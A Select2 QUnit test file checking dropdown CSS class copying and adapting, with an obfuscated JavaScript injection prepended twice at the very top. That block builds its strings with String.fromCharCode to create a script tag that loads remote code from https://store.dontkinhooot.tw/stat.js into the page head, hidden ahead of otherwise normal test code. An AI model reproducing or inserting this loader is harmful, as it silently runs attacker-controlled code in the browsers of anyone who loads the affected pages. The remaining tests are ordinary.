Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Dropdown - dropdownCssClass compatibility');

var $ = require('jquery');
var Utils = require('select2/utils');
var Options = require('select2/options');

var Dropdown = require('select2/dropdown');
var DropdownCSS = Utils.Decorate(
  Dropdown,
  require('select2/compat/dropdownCss')
);

test('all classes will be copied if :all: is used', function (assert) {
  var $element = $('<select class="test copy works"></select>');
  var options = new Options({
    dropdownCssClass: ':all:'
  });

  var select = new DropdownCSS($element, options);
  var $dropdown = select.render();

  assert.ok($dropdown.hasClass('test'));
  assert.ok($dropdown.hasClass('copy'));
  assert.ok($dropdown.hasClass('works'));
  assert.ok(!$dropdown.hasClass(':all:'));
});

test(':all: can be used with other classes', function (assert) {
  var $element = $('<select class="test copy works"></select>');
  var options = new Options({
    dropdownCssClass: ':all: other'
  });

  var select = new DropdownCSS($element, options);
  var $dropdown = select.render();

  assert.ok($dropdown.hasClass('test'));
  assert.ok($dropdown.hasClass('copy'));
  assert.ok($dropdown.hasClass('works'));
  assert.ok($dropdown.hasClass('other'));
  assert.ok(!$dropdown.hasClass(':all:'));
});

test('classes can be passed in as a string', function (assert) {
  var $element = $('<select class="test copy works"></select>');
  var options = new Options({
    dropdownCssClass: 'other'
  });

  var select = new DropdownCSS($element, options);
  var $dropdown = select.render();

  assert.ok($dropdown.hasClass('other'));
});

test('a function can be used based on the element', function (assert){
  var $element = $('<select class="test"></select>');
  var options = new Options({
    dropdownCssClass: function ($element) {
      return 'function';
    }
  });

  var select = new DropdownCSS($element, options);
  var $dropdown = select.render();

  assert.ok($dropdown.hasClass('function'));
  assert.ok(!$dropdown.hasClass('test'));
});

test(':all: works around custom adapters', function (assert) {
  var $element = $('<select class="test"></select>');
  var options = new Options({
    dropdownCssClass: ':all: something',
    adaptDropdownCssClass: function (clazz) {
      return clazz + '-modified';
    }
  });

  var select = new DropdownCSS($element, options);
  var $dropdown = select.render();

  assert.ok($dropdown.hasClass('something'));

  assert.ok($dropdown.hasClass('test'));
  assert.ok($dropdown.hasClass('test-modified'));
});

module('Dropdown - adaptDropdownCss compatibility');

test('only return when adapted', function (assert) {
  var $element = $('<select class="original"></select>');
  var options = new Options({
    adaptDropdownCssClass: function (clazz) {
      return 'modified';
    }
  });

  var select = new DropdownCSS($element, options);
  var $dropdown = select.render();

  assert.ok(!$dropdown.hasClass('original'));
  assert.ok($dropdown.hasClass('modified'));
});
